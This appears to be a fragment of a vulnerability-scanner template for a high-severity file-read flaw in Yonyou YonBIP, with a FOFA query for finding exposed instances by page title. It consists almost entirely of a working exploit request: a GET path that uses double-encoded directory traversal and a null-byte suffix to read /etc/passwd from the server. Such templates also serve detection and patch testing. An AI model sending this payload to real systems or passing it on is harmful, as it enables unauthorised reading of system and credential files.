  severity: high
  tags:
  - 文件读取
  finger: 用友YonBIP
  fofa: title="数字化工作台" || title="YonBIP"
requests:
- method: GET
  path: /iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.jpg.js
